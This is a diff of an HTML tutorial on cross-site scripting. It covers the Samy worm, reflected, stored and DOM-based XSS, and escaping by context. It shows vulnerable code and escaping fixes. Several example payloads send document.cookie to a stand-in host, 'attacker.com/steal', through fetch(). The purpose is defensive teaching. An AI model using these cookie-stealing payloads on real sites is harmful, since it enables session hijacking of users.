@@ -85,9 +85,12 @@ code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warni
   could add custom JavaScript to his MySpace profile, bypassing the
   site’s security filters. He created what became the first major
   self-propagating cross-site scripting (XSS) worm. When users viewed
-  his profile, the injected code would: 1. Add Samy as a friend 2. Add
-  “but most of all, Samy is my hero” to their profile 3. Copy itself to
-  their profile, attacking anyone who viewed it</p>
+  his profile, the injected code would:</p>
+  <ol type="1">
+  <li>Add Samy as a friend</li>
+  <li>Add “but most of all, Samy is my hero” to their profile</li>
+  <li>Copy itself to their profile, attacking anyone who viewed it</li>
+  </ol>
   <p>Within 20 hours, over one million MySpace users had unknowingly
   executed this code, adding Samy as a friend and spreading the worm to
   their own profiles. The exponential spread brought MySpace’s servers
@@ -157,36 +160,40 @@ code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warni
 <span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> query <span class="op">=</span> req<span class="op">.</span><span class="at">query</span><span class="op">.</span><span class="at">q</span><span class="op">;</span></span>
 <span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>  res<span class="op">.</span><span class="fu">send</span>(<span class="vs">`&lt;h1&gt;Search results for </span><span class="sc">${</span>query<span class="sc">}</span><span class="vs">&lt;/h1&gt;`</span>)<span class="op">;</span></span>
 <span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span></code></pre></div>
-  <p>Attack: 1. Attacker crafts a malicious URL:
-  <code>https://example.com/search?q=&lt;script&gt;alert('xss')&lt;/script&gt;</code>
-  2. Attacker sends link to victim (via email, message, etc.) 3. Victim
-  clicks link, sending the payload to the server 4. Server reflects
-  payload back in the response 5. Victim’s browser executes the
-  script</p>
+  <p>Attack:</p>
+  <ol type="1">
+  <li><p>Attacker crafts a malicious URL:</p>
+  <pre><code>https://example.com/search?q=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></pre></li>
+  <li><p>Attacker sends link to victim (via email, message,
+  etc.)</p></li>
+  <li><p>Victim clicks link, sending the payload to the server</p></li>
+  <li><p>Server reflects payload back in the response</p></li>
+  <li><p>Victim’s browser executes the script</p></li>
+  </ol>
   <h3 id="stored-xss">Stored XSS</h3>
   <p>In stored XSS (also called persistent XSS), the malicious script is
   permanently stored on the target server (e.g., in a database) and
   served to multiple victims. For example, this discussion forum code is
   vulnerable:</p>
-  <div class="sourceCode" id="cb5"><pre
-  class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="co">// Server code - storing a comment</span></span>
-<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>app<span class="op">.</span><span class="fu">post</span>(<span class="st">&#39;/comments&#39;</span><span class="op">,</span> (req<span class="op">,</span> res) <span class="kw">=&gt;</span> {</span>
-<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> comment <span class="op">=</span> req<span class="op">.</span><span class="at">body</span><span class="op">.</span><span class="at">comment</span><span class="op">;</span></span>
-<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>  <span class="co">// Vulnerability: comment stored without sanitization</span></span>
-<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>  db<span class="op">.</span><span class="at">comments</span><span class="op">.</span><span class="fu">insert</span>(comment)<span class="op">;</span></span>
-<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span>
-<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a><span class="co">// Server code - displaying comments</span></span>
-<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a>app<span class="op">.</span><span class="fu">get</span>(<span class="st">&#39;/post/:id&#39;</span><span class="op">,</span> (req<span class="op">,</span> res) <span class="kw">=&gt;</span> {</span>
-<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> comments <span class="op">=</span> db<span class="op">.</span><span class="at">comments</span><span class="op">.</span><span class="fu">findByPostId</span>(req<span class="op">.</span><span class="at">params</span><span class="op">.</span><span class="at">id</span>)<span class="op">;</span></span>
-<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a>  <span class="co">// Vulnerability: comments inserted directly into HTML</span></span>
-<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a>  res<span class="op">.</span><span class="fu">send</span>(<span class="vs">`</span></span>
-<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a><span class="vs">    &lt;h1&gt;Post&lt;/h1&gt;</span></span>
-<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a><span class="vs">    &lt;div class=&quot;comments&quot;&gt;</span></span>
-<span id="cb5-15"><a href="#cb5-15" aria-hidden="true" tabindex="-1"></a><span class="vs">      </span><span class="sc">${</span>comments<span class="op">.</span><span class="fu">map</span>(c <span class="kw">=&gt;</span> <span class="vs">`&lt;div&gt;</span><span class="sc">${</span>c<span class="sc">}</span><span class="vs">&lt;/div&gt;`</span>)<span class="op">.</span><span class="fu">join</span>(<span class="st">&#39;&#39;</span>)<span class="sc">}</span></span>
-<span id="cb5-16"><a href="#cb5-16" aria-hidden="true" tabindex="-1"></a><span class="vs">    &lt;/div&gt;</span></span>
-<span id="cb5-17"><a href="#cb5-17" aria-hidden="true" tabindex="-1"></a><span class="vs">  `</span>)<span class="op">;</span></span>
-<span id="cb5-18"><a href="#cb5-18" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span></code></pre></div>
+  <div class="sourceCode" id="cb6"><pre
+  class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="co">// Server code - storing a comment</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a>app<span class="op">.</span><span class="fu">post</span>(<span class="st">&#39;/comments&#39;</span><span class="op">,</span> (req<span class="op">,</span> res) <span class="kw">=&gt;</span> {</span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> comment <span class="op">=</span> req<span class="op">.</span><span class="at">body</span><span class="op">.</span><span class="at">comment</span><span class="op">;</span></span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a>  <span class="co">// Vulnerability: comment stored without sanitization</span></span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a>  db<span class="op">.</span><span class="at">comments</span><span class="op">.</span><span class="fu">insert</span>(comment)<span class="op">;</span></span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span>
+<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a><span class="co">// Server code - displaying comments</span></span>
+<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a>app<span class="op">.</span><span class="fu">get</span>(<span class="st">&#39;/post/:id&#39;</span><span class="op">,</span> (req<span class="op">,</span> res) <span class="kw">=&gt;</span> {</span>
+<span id="cb6-10"><a href="#cb6-10" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> comments <span class="op">=</span> db<span class="op">.</span><span class="at">comments</span><span class="op">.</span><span class="fu">findByPostId</span>(req<span class="op">.</span><span class="at">params</span><span class="op">.</span><span class="at">id</span>)<span class="op">;</span></span>
+<span id="cb6-11"><a href="#cb6-11" aria-hidden="true" tabindex="-1"></a>  <span class="co">// Vulnerability: comments inserted directly into HTML</span></span>
+<span id="cb6-12"><a href="#cb6-12" aria-hidden="true" tabindex="-1"></a>  res<span class="op">.</span><span class="fu">send</span>(<span class="vs">`</span></span>
+<span id="cb6-13"><a href="#cb6-13" aria-hidden="true" tabindex="-1"></a><span class="vs">    &lt;h1&gt;Post&lt;/h1&gt;</span></span>
+<span id="cb6-14"><a href="#cb6-14" aria-hidden="true" tabindex="-1"></a><span class="vs">    &lt;div class=&quot;comments&quot;&gt;</span></span>
+<span id="cb6-15"><a href="#cb6-15" aria-hidden="true" tabindex="-1"></a><span class="vs">      </span><span class="sc">${</span>comments<span class="op">.</span><span class="fu">map</span>(c <span class="kw">=&gt;</span> <span class="vs">`&lt;div&gt;</span><span class="sc">${</span>c<span class="sc">}</span><span class="vs">&lt;/div&gt;`</span>)<span class="op">.</span><span class="fu">join</span>(<span class="st">&#39;&#39;</span>)<span class="sc">}</span></span>
+<span id="cb6-16"><a href="#cb6-16" aria-hidden="true" tabindex="-1"></a><span class="vs">    &lt;/div&gt;</span></span>
+<span id="cb6-17"><a href="#cb6-17" aria-hidden="true" tabindex="-1"></a><span class="vs">  `</span>)<span class="op">;</span></span>
+<span id="cb6-18"><a href="#cb6-18" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span></code></pre></div>
   <p>An attacker could post a comment containing malicious JavaScript.
   Anyone viewing the post would execute this code, even long after the
   attack was planted. This makes stored XSS particularly dangerous.</p>
@@ -194,12 +201,12 @@ code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warni
   <p>DOM-based XSS occurs client-side, when JavaScript on the page
   processes data from an untrusted source (like the URL) and writes it
   to a dangerous DOM sink (like innerHTML). Example:</p>
-  <div class="sourceCode" id="cb6"><pre
-  class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="co">// Client-side JavaScript</span></span>
-<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="co">// Get &#39;name&#39; from URL: https://example.com/page?name=Bob</span></span>
-<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> name <span class="op">=</span> <span class="kw">new</span> <span class="fu">URL</span>(location<span class="op">.</span><span class="at">href</span>)<span class="op">.</span><span class="at">searchParams</span><span class="op">.</span><span class="fu">get</span>(<span class="st">&#39;name&#39;</span>)<span class="op">;</span></span>
-<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="co">// Vulnerability: writing URL data directly to innerHTML</span></span>
-<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a><span class="bu">document</span><span class="op">.</span><span class="fu">getElementById</span>(<span class="st">&#39;greeting&#39;</span>)<span class="op">.</span><span class="at">innerHTML</span> <span class="op">=</span> <span class="st">&#39;Hello, &#39;</span> <span class="op">+</span> name<span class="op">;</span></span></code></pre></div>
+  <div class="sourceCode" id="cb7"><pre
+  class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="co">// Client-side JavaScript</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="co">// Get &#39;name&#39; from URL: https://example.com/page?name=Bob</span></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> name <span class="op">=</span> <span class="kw">new</span> <span class="fu">URL</span>(location<span class="op">.</span><span class="at">href</span>)<span class="op">.</span><span class="at">searchParams</span><span class="op">.</span><span class="fu">get</span>(<span class="st">&#39;name&#39;</span>)<span class="op">;</span></span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="co">// Vulnerability: writing URL data directly to innerHTML</span></span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="bu">document</span><span class="op">.</span><span class="fu">getElementById</span>(<span class="st">&#39;greeting&#39;</span>)<span class="op">.</span><span class="at">innerHTML</span> <span class="op">=</span> <span class="st">&#39;Hello, &#39;</span> <span class="op">+</span> name<span class="op">;</span></span></code></pre></div>
   <p>An attacker could exploit this with a URL like:</p>
   <pre><code>https://example.com/page?name=&lt;img src=x onerror=alert(&#39;xss&#39;)&gt;</code></pre>
   <p>The vulnerability exists entirely in the frontend JavaScript - the
@@ -240,52 +247,52 @@ code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warni
   <p>This is when data appears between HTML tags, as text content.
   Browsers will parse any HTML tags or entities in this context.</p>
   <p>Example vulnerability:</p>
-  <div class="sourceCode" id="cb8"><pre
-  class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> username <span class="op">=</span> <span class="fu">getUserInput</span>()<span class="op">;</span></span>
-<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a>element<span class="op">.</span><span class="at">innerHTML</span> <span class="op">=</span> <span class="vs">`&lt;div&gt;Hello, </span><span class="sc">${</span>username<span class="sc">}</span><span class="vs">!&lt;/div&gt;`</span><span class="op">;</span></span></code></pre></div>
+  <div class="sourceCode" id="cb9"><pre
+  class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> username <span class="op">=</span> <span class="fu">getUserInput</span>()<span class="op">;</span></span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>element<span class="op">.</span><span class="at">innerHTML</span> <span class="op">=</span> <span class="vs">`&lt;div&gt;Hello, </span><span class="sc">${</span>username<span class="sc">}</span><span class="vs">!&lt;/div&gt;`</span><span class="op">;</span></span></code></pre></div>
   <p>If the user input is the following string:</p>
   <pre><code>&lt;script&gt;fetch(&#39;https://attacker.com/steal?c=&#39;+document.cookie)&lt;/script&gt;</code></pre>
   <p>Then the browser will render this HTML:</p>
-  <div class="sourceCode" id="cb10"><pre
-  class="sourceCode html"><code class="sourceCode html"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">div</span><span class="dt">&gt;</span>Hello, <span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span><span class="fu">fetch</span>(<span class="st">&#39;https://attacker.com/steal?c=&#39;</span><span class="op">+</span><span class="bu">document</span><span class="op">.</span><span class="at">cookie</span>)<span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span>!<span class="dt">&lt;/</span><span class="kw">div</span><span class="dt">&gt;</span></span></code></pre></div>
+  <div class="sourceCode" id="cb11"><pre
+  class="sourceCode html"><code class="sourceCode html"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">div</span><span class="dt">&gt;</span>Hello, <span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span><span class="fu">fetch</span>(<span class="st">&#39;https://attacker.com/steal?c=&#39;</span><span class="op">+</span><span class="bu">document</span><span class="op">.</span><span class="at">cookie</span>)<span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span>!<span class="dt">&lt;/</span><span class="kw">div</span><span class="dt">&gt;</span></span></code></pre></div>
   <p>To prevent XSS in this context, we need to escape special
   characters that could be interpreted as HTML or <a
   href="https://www.w3schools.com/html/html_entities.asp">HTML
   entities</a>:</p>
-  <div class="sourceCode" id="cb11"><pre
-  class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">escapeHtml</span>(unsafe) {</span>
-<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> unsafe</span>
-<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a>    <span class="op">.</span><span class="fu">replace</span>(<span class="ss">/&amp;/g</span><span class="op">,</span> <span class="st">&#39;&amp;amp;&#39;</span>)    <span class="co">// Must be first to avoid double-escaping</span></span>
-<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a>    <span class="op">.</span><span class="fu">replace</span>(<span class="ss">/&lt;/g</span><span class="op">,</span> <span class="st">&#39;&amp;lt;&#39;</span>)</span>
-<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a>    <span class="op">.</span><span class="fu">replace</span>(<span class="op">/&gt;/</span>g<span class="op">,</span> <span class="st">&#39;&amp;gt;&#39;</span>)<span class="op">;</span></span>
-<span id="cb11-6"><a href="#cb11-6" aria-hidden="true" tabindex="-1"></a>}</span>
-<span id="cb11-7"><a href="#cb11-7" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb11-8"><a href="#cb11-8" aria-hidden="true" tabindex="-1"></a><span class="co">// Usage</span></span>
-<span id="cb11-9"><a href="#cb11-9" aria-hidden="true" tabindex="-1"></a>element<span class="op">.</span><span class="at">innerHTML</span> <span class="op">=</span> <span class="vs">`&lt;div&gt;Hello, </span><span class="sc">${</span><span class="fu">escapeHtml</span>(username)<span class="sc">}</span><span class="vs">!&lt;/div&gt;`</span><span class="op">;</span></span></code></pre></div>
+  <div class="sourceCode" id="cb12"><pre
+  class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">escapeHtml</span>(unsafe) {</span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> unsafe</span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a>    <span class="op">.</span><span class="fu">replace</span>(<span class="ss">/&amp;/g</span><span class="op">,</span> <span class="st">&#39;&amp;amp;&#39;</span>)    <span class="co">// Must be first to avoid double-escaping</span></span>
+<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a>    <span class="op">.</span><span class="fu">replace</span>(<span class="ss">/&lt;/g</span><span class="op">,</span> <span class="st">&#39;&amp;lt;&#39;</span>)</span>
+<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a>    <span class="op">.</span><span class="fu">replace</span>(<span class="op">/&gt;/</span>g<span class="op">,</span> <span class="st">&#39;&amp;gt;&#39;</span>)<span class="op">;</span></span>
+<span id="cb12-6"><a href="#cb12-6" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb12-7"><a href="#cb12-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-8"><a href="#cb12-8" aria-hidden="true" tabindex="-1"></a><span class="co">// Usage</span></span>
+<span id="cb12-9"><a href="#cb12-9" aria-hidden="true" tabindex="-1"></a>element<span class="op">.</span><span class="at">innerHTML</span> <span class="op">=</span> <span class="vs">`&lt;div&gt;Hello, </span><span class="sc">${</span><span class="fu">escapeHtml</span>(username)<span class="sc">}</span><span class="vs">!&lt;/div&gt;`</span><span class="op">;</span></span></code></pre></div>
   <h3 id="html-attribute-context">HTML Attribute Context</h3>
   <p>This is when data appears within HTML attributes. The challenge
   here is preventing attackers from breaking out of the attribute value
   and injecting new attributes or tags.</p>
   <p>Example vulnerability:</p>
-  <div class="sourceCode" id="cb12"><pre
-  class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> userTheme <span class="op">=</span> <span class="fu">getUserInput</span>()<span class="op">;</span></span>
-<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a>element<span class="op">.</span><span class="at">innerHTML</span> <span class="op">=</span> <span class="vs">`&lt;div class=&quot;</span><span class="sc">${</span>userTheme<span class="sc">}</span><span class="vs">&quot;&gt;Hello&lt;/div&gt;`</span><span class="op">;</span></span></code></pre></div>
+  <div class="sourceCode" id="cb13"><pre
+  class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> userTheme <span class="op">=</span> <span class="fu">getUserInput</span>()<span class="op">;</span></span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a>element<span class="op">.</span><span class="at">innerHTML</span> <span class="op">=</span> <span class="vs">`&lt;div class=&quot;</span><span class="sc">${</span>userTheme<span class="sc">}</span><span class="vs">&quot;&gt;Hello&lt;/div&gt;`</span><span class="op">;</span></span></code></pre></div>
   <p>If the user input is the following string:</p>
   <pre><code>dark&quot; onmouseover=&quot;fetch(&#39;https://attacker.com/steal?c=&#39;+document.cookie)</code></pre>
   <p>Then the browser will render this HTML:</p>
-  <div class="sourceCode" id="cb14"><pre
-  class="sourceCode html"><code class="sourceCode html"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">div</span><span class="ot"> class</span><span class="op">=</span><span class="st">&quot;dark&quot;</span><span class="ot"> onmouseover</span><span class="op">=</span><span class="st">&quot;fetch(&#39;https://attacker.com/steal?c=&#39;+document.cookie)&quot;</span><span class="dt">&gt;</span>Hello<span class="dt">&lt;/</span><span class="kw">div</span><span class="dt">&gt;</span></span></code></pre></div>
-  <p>Proper handling requires both escaping and always using quotes:</p>
   <div class="sourceCode" id="cb15"><pre
-  class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">escapeHtmlAttribute</span>(unsafe) {</span>
-<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> unsafe</span>
-<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a>    <span class="op">.</span><span class="fu">replace</span>(<span class="ss">/&amp;/g</span><span class="op">,</span> <span class="st">&#39;&amp;amp;&#39;</span>)</span>
-<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a>    <span class="op">.</span><span class="fu">replace</span>(<span class="ss">/&#39;/g</span><span class="op">,</span> <span class="st">&#39;&amp;apos;&#39;</span>)</span>
-<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a>    <span class="op">.</span><span class="fu">replace</span>(<span class="ss">/&quot;/g</span><span class="op">,</span> <span class="st">&#39;&amp;quot;&#39;</span>)<span class="op">;</span></span>
-<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a>}</span>
-<span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb15-8"><a href="#cb15-8" aria-hidden="true" tabindex="-1"></a><span class="co">// Usage - always quote attributes!</span></span>
-<span id="cb15-9"><a href="#cb15-9" aria-hidden="true" tabindex="-1"></a>element<span class="op">.</span><span class="at">innerHTML</span> <span class="op">=</span> <span class="vs">`&lt;div class=&quot;</span><span class="sc">${</span><span class="fu">escapeHtmlAttribute</span>(userColor)<span class="sc">}</span><span class="vs">&quot;&gt;Hello&lt;/div&gt;`</span><span class="op">;</span></span></code></pre></div>
+  class="sourceCode html"><code class="sourceCode html"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">div</span><span class="ot"> class</span><span class="op">=</span><span class="st">&quot;dark&quot;</span><span class="ot"> onmouseover</span><span class="op">=</span><span class="st">&quot;fetch(&#39;https://attacker.com/steal?c=&#39;+document.cookie)&quot;</span><span class="dt">&gt;</span>Hello<span class="dt">&lt;/</span><span class="kw">div</span><span class="dt">&gt;</span></span></code></pre></div>
+  <p>Proper handling requires both escaping and always using quotes:</p>
+  <div class="sourceCode" id="cb16"><pre
+  class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">escapeHtmlAttribute</span>(unsafe) {</span>
+<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> unsafe</span>
+<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a>    <span class="op">.</span><span class="fu">replace</span>(<span class="ss">/&amp;/g</span><span class="op">,</span> <span class="st">&#39;&amp;amp;&#39;</span>)</span>
+<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a>    <span class="op">.</span><span class="fu">replace</span>(<span class="ss">/&#39;/g</span><span class="op">,</span> <span class="st">&#39;&amp;apos;&#39;</span>)</span>
+<span id="cb16-5"><a href="#cb16-5" aria-hidden="true" tabindex="-1"></a>    <span class="op">.</span><span class="fu">replace</span>(<span class="ss">/&quot;/g</span><span class="op">,</span> <span class="st">&#39;&amp;quot;&#39;</span>)<span class="op">;</span></span>
+<span id="cb16-6"><a href="#cb16-6" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb16-7"><a href="#cb16-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb16-8"><a href="#cb16-8" aria-hidden="true" tabindex="-1"></a><span class="co">// Usage - always quote attributes!</span></span>
+<span id="cb16-9"><a href="#cb16-9" aria-hidden="true" tabindex="-1"></a>element<span class="op">.</span><span class="at">innerHTML</span> <span class="op">=</span> <span class="vs">`&lt;div class=&quot;</span><span class="sc">${</span><span class="fu">escapeHtmlAttribute</span>(userColor)<span class="sc">}</span><span class="vs">&quot;&gt;Hello&lt;/div&gt;`</span><span class="op">;</span></span></code></pre></div>
   <p><strong>Gotcha #1:</strong> For most attributes, escaping values is
   sufficient. However, beware special attributes like <code>src</code>
   and <code>href</code>. For example,
@@ -299,8 +306,8 @@ code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warni
   <p><strong>Gotcha #2:</strong> Untrusted input needs additional
   sanitization in <code>on*</code> attributes. For example, the
   following code is vulnerable:</p>
-  <div class="sourceCode" id="cb16"><pre
-  class="sourceCode html"><code class="sourceCode html"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">div</span><span class="ot"> onmouseover</span><span class="op">=</span><span class="st">&#39;handleHover(USER_DATA_HERE)&#39;</span><span class="dt">&gt;</span></span></code></pre></div>
+  <div class="sourceCode" id="cb17"><pre
+  class="sourceCode html"><code class="sourceCode html"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">div</span><span class="ot"> onmouseover</span><span class="op">=</span><span class="st">&#39;handleHover(USER_DATA_HERE)&#39;</span><span class="dt">&gt;</span></span></code></pre></div>
   <p>If the user data is <code>); alert(document.cookie</code>, then the
   resulting HTML will be
   <code>&lt;div onmouseover='handleHover(); alert(document.cookie)'&gt;</code>.
@@ -310,64 +317,64 @@ code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warni
   context is particularly dangerous because it is hard to safely and
   reliably escape JavaScript in the context of an HTML file.</p>
   <p>Example vulnerability:</p>
-  <div class="sourceCode" id="cb17"><pre
-  class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> userName <span class="op">=</span> <span class="fu">getUserInput</span>()<span class="op">;</span></span>
-<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> script <span class="op">=</span> <span class="vs">`</span></span>
-<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a><span class="vs">  &lt;script&gt;</span></span>
-<span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a><span class="vs">    const user = &quot;</span><span class="sc">${</span>userName<span class="sc">}</span><span class="vs">&quot;;</span></span>
-<span id="cb17-5"><a href="#cb17-5" aria-hidden="true" tabindex="-1"></a><span class="vs">    showGreeting(user);</span></span>
-<span id="cb17-6"><a href="#cb17-6" aria-hidden="true" tabindex="-1"></a><span class="vs">  &lt;/script&gt;</span></span>
-<span id="cb17-7"><a href="#cb17-7" aria-hidden="true" tabindex="-1"></a><span class="vs">`</span><span class="op">;</span></span></code></pre></div>
+  <div class="sourceCode" id="cb18"><pre
+  class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> userName <span class="op">=</span> <span class="fu">getUserInput</span>()<span class="op">;</span></span>
+<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> script <span class="op">=</span> <span class="vs">`</span></span>
+<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a><span class="vs">  &lt;script&gt;</span></span>
+<span id="cb18-4"><a href="#cb18-4" aria-hidden="true" tabindex="-1"></a><span class="vs">    const user = &quot;</span><span class="sc">${</span>userName<span class="sc">}</span><span class="vs">&quot;;</span></span>
+<span id="cb18-5"><a href="#cb18-5" aria-hidden="true" tabindex="-1"></a><span class="vs">    showGreeting(user);</span></span>
+<span id="cb18-6"><a href="#cb18-6" aria-hidden="true" tabindex="-1"></a><span class="vs">  &lt;/script&gt;</span></span>
+<span id="cb18-7"><a href="#cb18-7" aria-hidden="true" tabindex="-1"></a><span class="vs">`</span><span class="op">;</span></span></code></pre></div>
   <p>If the user input is the following string:</p>
   <pre><code>&quot;; fetch(&#39;https://attacker.com/steal?c=&#39;+document.cookie); &quot;</code></pre>
   <p>Then the browser will render this HTML:</p>
-  <div class="sourceCode" id="cb19"><pre
-  class="sourceCode html"><code class="sourceCode html"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span></span>
